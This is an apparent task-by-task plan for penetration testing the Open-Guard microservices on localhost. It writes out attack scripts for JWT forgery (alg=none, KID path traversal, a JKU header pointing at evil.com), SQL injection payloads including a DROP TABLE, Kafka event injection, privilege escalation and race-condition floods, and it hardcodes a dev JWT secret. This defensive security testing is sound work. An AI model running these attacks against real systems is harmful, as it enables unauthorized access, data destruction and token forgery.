# Penetration Test Execution Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Execute full-stack penetration test across all Open-Guard microservices, data stores, and infrastructure.

**Architecture:** 4-layer attack surface progression (Perimeter → Service Mesh → Data Layer → Business Logic) using Burp Suite, custom Go scripts, and targeted automation.

**Tech Stack:** Burp Suite (Pro), Go 1.22+, kcat, curl/jq, psql, mongosh, openssl, Python 3

**Reference Spec:** `docs/superpowers/specs/2026-05-09-penetration-test-plan-design.md`

---

### Task 0: Pentest Environment Setup

**Files:**
- Create: `pentest/config.sh`
- Create: `pentest/secrets.env`
- Create: `pentest/README.md`
- Modify: `.gitignore`

- [ ] **Step 1: Create pentest directory structure**

Run:
```bash
mkdir -p pentest/{scripts,data,burp-configs,reports/findings,reports/evidence}
touch pentest/secrets.env
```

- [ ] **Step 2: Write the pentest environment config**

Write `pentest/config.sh`:

```bash
#!/usr/bin/env bash
# Pentest Environment Configuration
# Source this file to load test parameters

export GATEWAY_URL="${GATEWAY_URL:-http://localhost:8080}"
export IAM_URL="${IAM_URL:-http://localhost:8082}"
export POLICY_URL="${POLICY_URL:-http://localhost:8083}"
export THREAT_URL="${THREAT_URL:-http://localhost:8084}"
export AUDIT_URL="${AUDIT_URL:-http://localhost:8085}"
export ALERTING_URL="${ALERTING_URL:-http://localhost:8086}"
export COMPLIANCE_URL="${COMPLIANCE_URL:-http://localhost:8088}"
export DLP_URL="${DLP_URL:-http://localhost:8089}"
export REGISTRY_URL="${REGISTRY_URL:-http://localhost:8090}"
export CONTROL_PLANE_URL="${CONTROL_PLANE_URL:-http://localhost:8081}"
export EXAMPLE_APP_URL="${EXAMPLE_APP_URL:-http://localhost:3005}"

export KAFKA_BROKER="${KAFKA_BROKER:-localhost:9092}"
export REDIS_ADDR="${REDIS_ADDR:-localhost:6379}"
export MONGO_URI="${MONGO_URI:-mongodb://localhost:27017}"
export PG_URL="${PG_URL:-postgres://openguard:openguard@localhost:5432/openguard?sslmode=disable}"
export CLICKHOUSE_HTTP="${CLICKHOUSE_HTTP:-http://localhost:8123}"

# Test accounts (populated from make seed)
export ADMIN_EMAIL="${ADMIN_EMAIL:-admin@alpha.openguard.local}"
export ADMIN_PASSWORD="${ADMIN_PASSWORD:-Admin123!}"
export USER_A_EMAIL="${USER_A_EMAIL:-user@alpha.openguard.local}"
export USER_A_PASSWORD="${USER_A_PASSWORD:-User123!}"
export USER_B_EMAIL="${USER_B_EMAIL:-user@beta.openguard.local}"
export USER_B_PASSWORD="${USER_B_PASSWORD:-User123!}"
export READONLY_EMAIL="${READONLY_EMAIL:-readonly@alpha.openguard.local}"
export READONLY_PASSWORD="${READONLY_PASSWORD:-Readonly123!}"

# JWT dev secret
export JWT_DEV_SECRET="${JWT_DEV_SECRET:-dev-secret-at-least-32-chars-long-!!}"

# Output
export PENTEST_OUTPUT="${PENTEST_OUTPUT:-pentest/reports}"
mkdir -p "$PENTEST_OUTPUT"
```

- [ ] **Step 3: Add pentest directory to .gitignore**

Append to `.gitignore`:
```
# Pentest artifacts
pentest/secrets.env
pentest/reports/**
!pentest/reports/README.md
pentest/data/**
```

- [ ] **Step 4: Write pentest README**

Write `pentest/README.md`:

```markdown
# Open-Guard Penetration Testing

## Quick Start

```bash
# 1. Source environment
source pentest/config.sh

# 2. Verify connectivity
./pentest/scripts/health-check.sh

# 3. Authenticate and get tokens
./pentest/scripts/get-tokens.sh
```

## Directory Structure

```
pentest/
├── config.sh                 # Environment configuration
├── README.md                 # This file
├── secrets.env               # Sensitive values (gitignored)
├── scripts/
│   ├── health-check.sh       # Service connectivity check
│   ├── get-tokens.sh         # Authenticate all test accounts
│   ├── role-matrix.sh        # Automated role matrix testing
│   ├── jwt-attacks.sh        # JWT manipulation tests
│   ├── kafka-inject.sh       # Kafka event injection
│   ├── rls-bypass.sh         # RLS bypass attempts
│   ├── race-condition.sh     # Turbo Intruder race tests
│   └── report-template.md    # Finding report template
├── burp-configs/
│   └── openguard-scope.json  # Burp scope configuration
├── data/                     # Test payloads (gitignored)
├── reports/
│   ├── findings/             # Per-finding reports
│   └── evidence/             # Screenshots, request captures
└── findings.db               # SQLite tracking DB
```

## Pentest Workflow

1. `Task 0`: Setup environment
2. `Task 1`: Layer 1 - Perimeter
3. `Task 2`: Layer 2 - Service Mesh
4. `Task 3`: Layer 3 - Data Layer
5. `Task 4`: Layer 4 - Business Logic
6. `Task 5`: Reporting & Retest
```

- [ ] **Step 5: Commit**

```bash
git add pentest/ .gitignore
git commit -m "feat: add pentest directory structure and config"
```

---

### Task 1: Health Check & Connectivity Scripts

**Files:**
- Create: `pentest/scripts/health-check.sh`
- Create: `pentest/scripts/get-tokens.sh`

- [ ] **Step 1: Write the health check script**

Write `pentest/scripts/health-check.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

echo "=== Open-Guard Pentest Health Check ==="
echo ""

services=(
  "Gateway:$GATEWAY_URL/health"
  "IAM:$IAM_URL/health"
  "Policy:$POLICY_URL/health"
  "Control Plane:$CONTROL_PLANE_URL/health"
  "Threat:$THREAT_URL/health"
  "Audit:$AUDIT_URL/health"
  "Alerting:$ALERTING_URL/health"
  "Compliance:$COMPLIANCE_URL/health"
  "DLP:$DLP_URL/health"
  "Connector Registry:$REGISTRY_URL/health"
  "Example App:$EXAMPLE_APP_URL/api/tasks"
)

all_ok=true
for entry in "${services[@]}"; do
  name="${entry%%:*}"
  url="${entry#*:}"
  status=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$url" 2>/dev/null || echo "FAIL")
  if [ "$status" = "200" ] || [ "$status" = "000" ]; then
    # 000 means empty response but service is up
    if [ "$status" = "000" ]; then
      echo "[OK] $name ($url) - responding"
    else
      echo "[OK] $name ($url) - HTTP $status"
    fi
  else
    echo "[FAIL] $name ($url) - HTTP $status"
    all_ok=false
  fi
done

echo ""
# Check infrastructure
echo "--- Infrastructure ---"
for tool in psql mongosh redis-cli kcat; do
  if command -v "$tool" &>/dev/null; then
    echo "[OK] $tool found"
  else
    echo "[WARN] $tool not installed"
  fi
done

echo ""
# Check Kafka connectivity
echo "--- Kafka Topics ---"
kcat -L -b "$KAFKA_BROKER" -t 2>/dev/null | grep -E "^  topic" || echo "[WARN] Cannot list Kafka topics"

echo ""
if [ "$all_ok" = true ]; then
  echo "All services OK"
else
  echo "Some services failed - check docker compose ps"
  exit 1
fi
```

- [ ] **Step 2: Write the authentication script**

Write `pentest/scripts/get-tokens.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

AUTH_ENDPOINT="$GATEWAY_URL/auth/login"
TOKEN_DIR="${PENTEST_OUTPUT}/tokens"
mkdir -p "$TOKEN_DIR"

login() {
  local label="$1" email="$2" password="$3"
  local outfile="$TOKEN_DIR/${label}.json"

  echo "Logging in as $label ($email)..."
  curl -s -X POST "$AUTH_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"$password\"}" \
    -c "$TOKEN_DIR/${label}.cookies.txt" \
    -o "$outfile"

  if jq -e '.access_token' "$outfile" >/dev/null 2>&1; then
    local token=$(jq -r '.access_token' "$outfile")
    echo "$token" > "$TOKEN_DIR/${label}.jwt"
    echo "  token: ${token:0:40}..."
    echo "  status: OK"
  elif jq -e '.mfa_challenge' "$outfile" >/dev/null 2>&1; then
    echo "  MFA required - saved challenge"
  else
    echo "  FAIL: $(jq -c '.' "$outfile")"
  fi
}

login "admin" "$ADMIN_EMAIL" "$ADMIN_PASSWORD"
login "user_a" "$USER_A_EMAIL" "$USER_A_PASSWORD"
login "user_b" "$USER_B_EMAIL" "$USER_B_PASSWORD"
login "readonly" "$READONLY_EMAIL" "$READONLY_PASSWORD"

echo ""
echo "Tokens saved to $TOKEN_DIR/"
ls -la "$TOKEN_DIR/"
```

- [ ] **Step 3: Make scripts executable and verify**

```bash
chmod +x pentest/scripts/health-check.sh pentest/scripts/get-tokens.sh
./pentest/scripts/health-check.sh
```

Expected output: All services respond with HTTP 200.

- [ ] **Step 4: Commit**

```bash
git add pentest/scripts/
git commit -m "feat: add pentest health check and auth scripts"
```

---

### Task 2: Layer 1 — Perimeter Testing Automation

**Files:**
- Create: `pentest/burp-configs/openguard-scope.json`
- Create: `pentest/scripts/jwt-attacks.sh`
- Create: `pentest/scripts/endpoint-enum.sh`

- [ ] **Step 1: Write Burp Suite project configuration**

Write `pentest/burp-configs/openguard-scope.json`:
```json
{
  "project_name": "Open-Guard Pentest",
  "scope": {
    "include": [
      {"host": "^.*\\.openguard\\.local$", "port": "80|443|8080"},
      {"host": "^localhost$", "port": "8080|8082|8083|8084|8085|8086|8087|8088|8089|8090|3005|4200"}
    ],
    "exclude": [
      {"host": "^localhost$", "port": "9090|3010|16686|3100"}
    ]
  },
  "session_handling": {
    "rules": [
      {
        "description": "Auto-extract JWT from login response",
        "url": "http://localhost:8080/auth/login",
        "method": "POST",
        "extract": "access_token",
        "header": "Authorization: Bearer {{access_token}}"
      }
    ]
  },
  "extensions": {
    "autorize": {
      "enabled": true,
      "low_priv_cookie": "openguard_session",
      "high_priv_cookie": "openguard_session"
    },
    "param_miner": {
      "enabled": true,
      "targets": ["/auth/*", "/mgmt/*", "/v1/*"]
    }
  },
  "targets": {
    "gateway": {"host": "localhost", "port": 8080, "use_https": false},
    "iam_internal": {"host": "localhost", "port": 8082, "use_https": false},
    "angular": {"host": "localhost", "port": 4200, "use_https": false}
  }
}
```

- [ ] **Step 2: Write JWT attack script**

Write `pentest/scripts/jwt-attacks.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

echo "=== JWT Attack Tests ==="
echo ""

JWT=$(cat "${PENTEST_OUTPUT}/tokens/user_a.jwt" 2>/dev/null || echo "")
if [ -z "$JWT" ]; then
  echo "No JWT found. Run get-tokens.sh first."
  exit 1
fi

# Decode and display the JWT header/payload
echo "--- Original JWT ---"
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

echo ""
echo "--- Test 1: alg=none ---"
HEADER_NONE='{"alg":"none","typ":"JWT"}'
PAYLOAD=$(echo "$JWT" | cut -d. -f2)
B64_HEADER=$(echo -n "$HEADER_NONE" | base64 -w0 | tr '+/' '-_' | tr -d '=')
RESULT=$(curl -s -o /dev/null -w "%{http_code}" "$GATEWAY_URL/auth/me" \
  -H "Authorization: Bearer ${B64_HEADER}.${PAYLOAD}.")
echo "alg=none: HTTP $RESULT"  # Should be 401

echo ""
echo "--- Test 2: alg=HS256 with empty signature ---"
HEADER_HS256='{"alg":"HS256","typ":"JWT"}'
B64_HEADER=$(echo -n "$HEADER_HS256" | base64 -w0 | tr '+/' '-_' | tr -d '=')
RESULT=$(curl -s -o /dev/null -w "%{http_code}" "$GATEWAY_URL/auth/me" \
  -H "Authorization: Bearer ${B64_HEADER}.${PAYLOAD}.")
echo "empty sig: HTTP $RESULT"  # Should be 401

echo ""
echo "--- Test 3: KID injection (null byte) ---"
HEADER_KID='{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd\x00"}'
B64_HEADER=$(echo -n "$HEADER_KID" | base64 -w0 | tr '+/' '-_' | tr -d '=')
RESULT=$(curl -s -o /dev/null -w "%{http_code}" "$GATEWAY_URL/auth/me" \
  -H "Authorization: Bearer ${B64_HEADER}.${PAYLOAD}.")
echo "KID injection: HTTP $RESULT"

echo ""
echo "--- Test 4: JKU header injection ---"
HEADER_JKU='{"alg":"HS256","typ":"JWT","jku":"http://evil.com/jwks.json"}'
B64_HEADER=$(echo -n "$HEADER_JKU" | base64 -w0 | tr '+/' '-_' | tr -d '=')
ATTACK_PAYLOAD='{"sub":"admin","org_id":"alpha","role":"admin","iat":1700000000,"exp":9999999999}'
B64_PAYLOAD=$(echo -n "$ATTACK_PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=')
RESULT=$(curl -s -o /dev/null -w "%{http_code}" "$GATEWAY_URL/auth/me" \
  -H "Authorization: Bearer ${B64_HEADER}.${B64_PAYLOAD}.")
echo "JKU injection: HTTP $RESULT"

echo ""
echo "--- Test 5: Readonly user accessing admin endpoint ---"
READONLY_JWT=$(cat "${PENTEST_OUTPUT}/tokens/readonly.jwt" 2>/dev/null || echo "")
if [ -n "$READONLY_JWT" ]; then
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" "$GATEWAY_URL/mgmt/users" \
    -H "Authorization: Bearer $READONLY_JWT")
  echo "Readonly -> GET /mgmt/users: HTTP $RESULT"  # Should be 403
fi

echo ""
echo "JWT attack tests complete."
echo "> Manual: Use JWT Editor Burp extension for alg confusion HS256<->RS256"
```

- [ ] **Step 3: Write endpoint enumeration script**

Write `pentest/scripts/endpoint-enum.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

OUTPUT="${PENTEST_OUTPUT}/endpoint-scan.csv"
echo "method,url,status,content-type,body_length" > "$OUTPUT"

scan_endpoint() {
  local method="$1" url="$2" token_file="${3:-}"
  local auth_header=""
  if [ -n "$token_file" ] && [ -f "$token_file" ]; then
    auth_header="-H \"Authorization: Bearer $(cat $token_file)\""
  fi

  for method in GET POST PUT DELETE PATCH OPTIONS; do
    status=$(curl -s -X "$method" -o /dev/null -w "%{http_code}" \
      $auth_header "$url" 2>/dev/null)
    echo "$method,$url,$status" >> "$OUTPUT"
  done
}

echo "Scanning endpoints..."
echo "Results -> $OUTPUT"

# Gateway public endpoints
scan_endpoint "GET" "$GATEWAY_URL/health"
scan_endpoint "GET" "$GATEWAY_URL/auth/jwks"
scan_endpoint "POST" "$GATEWAY_URL/auth/login"
scan_endpoint "GET" "$GATEWAY_URL/auth/.well-known/openid-configuration"
scan_endpoint "GET" "$GATEWAY_URL/auth/saml/metadata?org_id=alpha"

# Metrics on every service
for svc_url in "$IAM_URL" "$POLICY_URL" "$THREAT_URL" "$AUDIT_URL" "$ALERTING_URL" "$COMPLIANCE_URL" "$DLP_URL" "$REGISTRY_URL"; do
  scan_endpoint "GET" "$svc_url/metrics"
done

# Authenticated endpoints
for token_label in admin user_a user_b readonly; do
  token_file="${PENTEST_OUTPUT}/tokens/${token_label}.jwt"
  scan_endpoint "GET" "$GATEWAY_URL/auth/me" "$token_file"
  scan_endpoint "GET" "$GATEWAY_URL/mgmt/users" "$token_file"
  scan_endpoint "GET" "$GATEWAY_URL/v1/policies/" "$token_file"
  scan_endpoint "GET" "$GATEWAY_URL/v1/threats/alerts" "$token_file"
  scan_endpoint "GET" "$GATEWAY_URL/v1/events" "$token_file"
done

echo "Done. Results saved to $OUTPUT"
```

- [ ] **Step 4: Make scripts executable and run endpoint scan**

```bash
chmod +x pentest/scripts/jwt-attacks.sh pentest/scripts/endpoint-enum.sh
./pentest/scripts/endpoint-enum.sh
```

- [ ] **Step 5: Commit**

```bash
git add pentest/
git commit -m "feat: add perimeter testing scripts (JWT attacks, endpoint enumeration)"
```

---

### Task 3: Layer 2 — Service Mesh Testing Automation

**Files:**
- Create: `pentest/scripts/kafka-inject.sh`
- Create: `pentest/scripts/ssrf-proxy.sh`

- [ ] **Step 1: Write Kafka injection script**

Write `pentest/scripts/kafka-inject.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

echo "=== Kafka Event Bus Testing ==="
echo ""

# Test 1: List all topics
echo "--- Test 1: List Kafka topics ---"
kcat -L -b "$KAFKA_BROKER" -t 3 2>/dev/null || echo "kcat not available"

# Test 2: Produce event to auth.events
echo ""
echo "--- Test 2: Inject event into auth.events ---"
echo '{"type":"LOGIN","email":"test@evil.com","source_ip":"10.0.0.1"}' | \
  kcat -P -b "$KAFKA_BROKER" -t "auth.events" 2>/dev/null && \
  echo "Event injected to auth.events" || echo "Cannot write to auth.events"

# Test 3: Produce event to policy.changes
echo ""
echo "--- Test 3: Inject event into policy.changes ---"
echo '{"action":"CREATE","policy_id":"pwned-policy","org_id":"alpha","effect":"DENY","resource":"*"}' | \
  kcat -P -b "$KAFKA_BROKER" -t "policy.changes" 2>/dev/null && \
  echo "Event injected to policy.changes" || echo "Cannot write to policy.changes"

# Test 4: Consume from outbox.dlq
echo ""
echo "--- Test 4: Check DLQ for accumulated messages ---"
kcat -C -b "$KAFKA_BROKER" -t "outbox.dlq" -o -5 -c 5 -e -t 2 2>/dev/null || \
  echo "Nothing in outbox.dlq or cannot consume"

# Test 5: Outbox poisoning via ingest endpoint
echo ""
echo "--- Test 5: Outbox topic injection via ingest endpoint ---"
ADMIN_TOKEN=$(cat "${PENTEST_OUTPUT}/tokens/admin.jwt" 2>/dev/null || echo "")
if [ -n "$ADMIN_TOKEN" ]; then
  # Attempt to write to a restricted topic
  curl -s -X POST "$AUDIT_URL/v1/events/ingest" \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"event":{"type":"TEST","topic":"policy.changes","data":"injected"}}' | jq .
fi

echo ""
echo "Kafka tests complete."
```

- [ ] **Step 2: Write SSRF proxy abuse script**

Write `pentest/scripts/ssrf-proxy.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

JWT=$(cat "${PENTEST_OUTPUT}/tokens/admin.jwt" 2>/dev/null || echo "")
if [ -z "$JWT" ]; then
  echo "No admin JWT found. Run get-tokens.sh first."
  exit 1
fi

echo "=== SSRF via Control Plane Proxy ==="
echo ""

# The control plane proxies requests to internal services
# Test: can we manipulate the proxied URL to hit arbitrary hosts?

# Test 1: Headers injection via proxy
echo "--- Test 1: Header injection via policy evaluate ---"
curl -s -X POST "$CONTROL_PLANE_URL/v1/policy/evaluate" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -H "X-Internal-Key: test" \
  -d '{"action":"test","resource":"test","context":{}}' | jq .

# Test 2: Try to hit internal metadata endpoints via proxy
echo ""
echo "--- Test 2: SSRF via SCIM proxy path ---"
curl -s -X GET "$CONTROL_PLANE_URL/v1/scim/v2/Users" \
  -H "Authorization: Bearer $JWT" \
  -o /dev/null -w "HTTP %{http_code}\n"

echo ""
echo "SSRF tests complete."
```

- [ ] **Step 3: Make scripts executable**

```bash
chmod +x pentest/scripts/kafka-inject.sh pentest/scripts/ssrf-proxy.sh
```

- [ ] **Step 4: Commit**

```bash
git add pentest/scripts/kafka-inject.sh pentest/scripts/ssrf-proxy.sh
git commit -m "feat: add service mesh testing scripts (Kafka, SSRF)"
```

---

### Task 4: Layer 3 — Data Layer Testing Automation

**Files:**
- Create: `pentest/scripts/sql-injection.sh`
- Create: `pentest/scripts/rls-bypass.sh`

- [ ] **Step 1: Write SQL injection test script**

Write `pentest/scripts/sql-injection.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

echo "=== SQL Injection Tests ==="
echo ""

# Test payloads
TIME_PAYLOADS=(
  "' OR 1=1--"
  "'; SELECT pg_sleep(3)--"
  "' UNION SELECT null,null,null--"
  "' AND 1=CAST((SELECT pg_sleep(3)) AS text)--"
  "'; WAITFOR DELAY '0:0:3'--"
)

echo "--- Time-based tests ---"
echo "These take 3+ seconds each (look for response delay)"

for payload in "${TIME_PAYLOADS[@]}"; do
  echo -n "Payload: $payload -> "
  start=$(date +%s%N)
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "$POLICY_URL/v1/policies/?name=$(echo -n "$payload" | jq -sRr @uri)" \
    -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/admin.jwt)" 2>/dev/null)
  end=$(date +%s%N)
  elapsed=$(( (end - start) / 1000000 ))
  echo "HTTP $code (${elapsed}ms)"
done

echo ""
echo "--- Error-based tests ---"
ERROR_PAYLOADS=(
  "'"                              # Basic quote
  "' OR '1'='1"                    # Always true
  "1; DROP TABLE users CASCADE"    # Destructive (verify rejection)
  "' UNION SELECT column_name FROM information_schema.columns--"
  "' AND 1=pg_sleep(0.1)--"
)

for payload in "${ERROR_PAYLOADS[@]}"; do
  echo -n "Payload: ${payload:0:40}..."
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "$POLICY_URL/v1/policies/?name=$(echo -n "$payload" | jq -sRr @uri)" \
    -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/admin.jwt)" 2>/dev/null)
  echo " HTTP $code"
done

echo ""
echo "--- Pagination/ORDER BY injection ---"
curl -s "$POLICY_URL/v1/policies/?limit=10&offset=0&order_by=name;SELECT+pg_sleep(3)--" \
  -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/admin.jwt)" \
  -o /dev/null -w "ORDER BY injection: HTTP %{http_code}, time: %{time_total}s\n"

echo ""
echo "SQL injection tests complete."
echo "> Manual: Use Burp Intruder with PostgreSQL payloads on all query params"
```

- [ ] **Step 2: Write RLS bypass test script**

Write `pentest/scripts/rls-bypass.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

echo "=== RLS Bypass & Multi-Tenancy Tests ==="
echo ""

# RLS bypass: Can user_a (Org A) access user_b (Org B) data?

# Test 1: user_a tries to view user_b's data via /auth/me bypass
echo "--- Test 1: Cross-org user data access ---"
echo "user_a (Org A) trying to access admin endpoint..."
curl -s -X GET "$GATEWAY_URL/mgmt/users" \
  -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/user_a.jwt)" \
  -o /dev/null -w "HTTP %{http_code}\n" | tee /dev/null

echo ""
echo "--- Test 2: Cross-org policy access ---"
echo "user_b (Org B) listing policies..."
curl -s -X GET "$GATEWAY_URL/v1/policies/" \
  -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/user_b.jwt)" \
  -H "Content-Type: application/json" \
  -o /dev/null -w "HTTP %{http_code}\n"

echo ""
echo "--- Test 3: user_a tries to access /mgmt/users (admin-only) ---"
curl -s -X GET "$GATEWAY_URL/mgmt/users" \
  -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/user_a.jwt)" \
  -o /dev/null -w "HTTP %{http_code}\n"

echo ""
echo "--- Test 4: user_a tries to create a user (admin-only) ---"
curl -s -X POST "$GATEWAY_URL/mgmt/users" \
  -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/user_a.jwt)" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@evil.com","password":"Hacked123!","role":"admin"}' \
  -o /dev/null -w "HTTP %{http_code}\n"

echo ""
echo "--- Test 5: user_a tries to delete a policy ---"
curl -s -X DELETE "$GATEWAY_URL/v1/policies/nonexistent" \
  -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/user_a.jwt)" \
  -o /dev/null -w "HTTP %{http_code}\n"

echo ""
echo "--- Test 6: user_a trying to access user_b's compliance reports ---"
curl -s -X GET "$GATEWAY_URL/v1/compliance/reports" \
  -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/user_b.jwt)" \
  -o /dev/null -w "HTTP %{http_code}\n"

echo ""
echo "RLS bypass tests complete."
```

- [ ] **Step 3: Make scripts executable**

```bash
chmod +x pentest/scripts/sql-injection.sh pentest/scripts/rls-bypass.sh
```

- [ ] **Step 4: Commit**

```bash
git add pentest/scripts/sql-injection.sh pentest/scripts/rls-bypass.sh
git commit -m "feat: add data layer testing scripts (SQL injection, RLS bypass)"
```

---

### Task 5: Layer 4 — Business Logic & Race Condition Scripts

**Files:**
- Create: `pentest/scripts/race-condition.sh`
- Create: `pentest/scripts/report-template.md`

- [ ] **Step 1: Write race condition test script**

Write `pentest/scripts/race-condition.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../config.sh"

echo "=== Race Condition Tests ==="
echo ""

RACE_ENDPOINTS=(
  "POST:$GATEWAY_URL/auth/refresh"
  "POST:$GATEWAY_URL/auth/mfa/verify"
  "POST:$GATEWAY_URL/mgmt/users"
  "POST:$GATEWAY_URL/v1/policies/"
)

concurrent_requests() {
  local method="$1" url="$2" data="$3" label="$4"
  echo "--- Testing $label ($url) ---"

  # Fire 10 concurrent requests
  for i in $(seq 1 10); do
    curl -s -X "$method" "$url" \
      -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/admin.jwt)" \
      -H "Content-Type: application/json" \
      -d "$data" \
      -o "/dev/null" \
      -w "req_$i: HTTP %{http_code}\n" &
  done
  wait
  echo ""
}

# Test 1: Refresh token rotation race
echo "--- Test 1: Refresh token race ---"
REFRESH_RESPONSE=$(curl -s -X POST "$GATEWAY_URL/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ADMIN_EMAIL\",\"password\":\"$ADMIN_PASSWORD\"}")
REFRESH_TOKEN=$(echo "$REFRESH_RESPONSE" | jq -r '.refresh_token // empty')
if [ -n "$REFRESH_TOKEN" ]; then
  for i in $(seq 1 5); do
    curl -s -X POST "$GATEWAY_URL/auth/refresh" \
      -H "Content-Type: application/json" \
      -d "{\"refresh_token\":\"$REFRESH_TOKEN\"}" \
      -o /dev/null -w "refresh_race_$i: HTTP %{http_code}\n" &
  done
  wait
  # After race: try the same token again (should be invalidated)
  echo "Reuse after race:"
  curl -s -X POST "$GATEWAY_URL/auth/refresh" \
    -H "Content-Type: application/json" \
    -d "{\"refresh_token\":\"$REFRESH_TOKEN\"}" \
    -w "HTTP %{http_code}\n" -o /dev/null
fi

# Test 2: User creation idempotency race
echo ""
echo "--- Test 2: User creation idempotency race ---"
IDEM_KEY="race-test-$(date +%s)"
for i in $(seq 1 5); do
  curl -s -X POST "$GATEWAY_URL/mgmt/users" \
    -H "Authorization: Bearer $(cat ${PENTEST_OUTPUT}/tokens/admin.jwt)" \
    -H "Content-Type: application/json" \
    -H "Idempotency-Key: $IDEM_KEY" \
    -d '{"email":"race-'"$i"'@test.com","password":"Test123!","role":"user"}' \
    -o /dev/null -w "create_race_$i: HTTP %{http_code}\n" &
done
wait

echo ""
echo "Race condition tests complete."
echo "> Manual: Use Turbo Intruder for high-precision race tests"
```

- [ ] **Step 2: Write finding report template**

Write `pentest/scripts/report-template.md`:

```markdown
## Finding: CWE-{ID} — {Title}

**Severity:** Critical / High / Medium / Low / Info
**Layer:** L1 / L2 / L3 / L4
**Status:** Open / Fixed / NFP
**CWE:** CWE-{number}

### Description

{2-3 sentences on the vulnerability and how it manifests in Open-Guard}

### Impact

{What an attacker can achieve}

**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
**CVSS Score:** {score}

### Affected Endpoints

- `{METHOD} {path}`

### Reproduction Steps

1. {step 1}
2. {step 2}
3. {step 3}

### Evidence

```
{relevant HTTP request/response or other evidence}
```

### Remediation

{Code-level fix description}

### Bypass Notes

{Only if previously reported as fixed — describe how the fix was bypassed}
```

- [ ] **Step 3: Make scripts executable**

```bash
chmod +x pentest/scripts/race-condition.sh
```

- [ ] **Step 4: Commit**

```bash
git add pentest/scripts/race-condition.sh pentest/scripts/report-template.md
git commit -m "feat: add race condition test and report template"
```

---

### Task 6: Findings Database & Reporting

**Files:**
- Create: `pentest/reports/findings/README.md`
- Create: `pentest/reports/evidence/README.md`

- [ ] **Step 1: Create findings directory structure**

Write `pentest/reports/findings/README.md`:
```markdown
# Penetration Test Findings

## Finding Format

Each finding is a markdown file with the template from `pentest/scripts/report-template.md`.

## Finding Index

| # | Title | Severity | Layer | Status | Date |
|---|-------|----------|-------|--------|------|
|   |       |          |       |        |      |

## Severity Legend

- CRITICAL: Immediate exploitation possible, severe impact
- HIGH: Exploitable with moderate effort, significant impact
- MEDIUM: Exploitable under specific conditions, moderate impact
- LOW: Limited impact, requires special conditions
- INFO: Observation, not a vulnerability
```

Write `pentest/reports/evidence/README.md`:
```markdown
# Pentest Evidence

Store screenshots, request captures, and proof-of-concept code here.

## Naming Convention

```
{YYYY-MM-DD}-{finding-number}-{description}.{ext}
```

Example: `2026-05-09-001-jwt-none-algorithm.png`
```

- [ ] **Step 2: Commit**

```bash
git add pentest/reports/
git commit -m "feat: add findings database and evidence directory structure"
```

---

### Task 7: Manual Testing Runbook

**Files:**
- None (this is a written reference section)

This section documents the manual Burp Suite procedures for each layer. The pentester executes these alongside the automation scripts.

#### Layer 1 — Manual Burp Steps

1. **Configure Burp proxy** to `localhost:8080` (gateway)
2. **Browse the Angular app** at `localhost:4200` — log all traffic through Burp
3. **Map site structure** using Burp Target > Site Map
4. **Test CORS:** Send OPTIONS request with `Origin: https://evil.com` — check response headers
5. **Test each unauthenticated endpoint** with Repeater:
   - `GET /auth/jwks` — examine key material
   - `GET /auth/.well-known/openid-configuration` — check for sensitive URLs
   - `POST /auth/saml/acs` — XXE payload in SAML assertion XML
   - `GET /auth/saml/metadata?org_id=<enumeration>` — IDOR test on org_id
6. **JWT attacks via JWT Editor extension:**
   - Load the dev secret (`dev-secret-at-least-32-chars-long-!!`) as HS256 key
   - Test `alg: none`
   - Test KID injection (path traversal in KID value)
   - Test JKU header with collaborator URL
7. **Session analysis via Sequencer:** Capture 100+ `openguard_session` cookies and analyze entropy
8. **Lockout testing:** Send 15+ failed login attempts for the same email, observe escalating lockout

#### Layer 2 — Manual Burp Steps

1. **Direct port testing:** Configure Burp to proxy directly to `localhost:8082` (IAM), `localhost:8083` (Policy), etc.
2. **mTLS bypass:** Remove client certificate from Repeeter — test if optional mTLS accepts plain HTTP
3. **Internal key injection:** Add `X-Internal-Key: test` header to requests through the gateway
4. **Kafka event monitoring:** Use kcat to subscribe to `auth.events`, `data.access`, `policy.changes` and observe real-time flows

#### Layer 3 — Manual Burp Steps

